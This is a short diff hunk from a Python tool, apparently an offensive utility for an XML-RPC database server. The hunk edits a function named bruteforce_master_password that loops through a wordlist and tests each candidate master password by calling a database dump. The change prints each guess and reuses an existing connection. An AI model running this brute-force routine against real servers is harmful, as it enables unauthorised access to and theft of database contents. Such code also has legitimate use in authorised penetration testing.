@@ -290,8 +290,8 @@ def bruteforce_master_password(connection, wordlist_file=None):
     # Try each password
     for pwd in passwords:
         try:
-            url = connection.host.rstrip('/') + '/xmlrpc/2/db'
-            proxy = xmlrpc.client.ServerProxy(url, allow_none=True)
+            print(f"{Colors.i} Trying password: {pwd}")
+            proxy = connection.master  
 
             # Use `dump` as it requires correct master password
             proxy.dump(pwd, 'fake_db_73189')
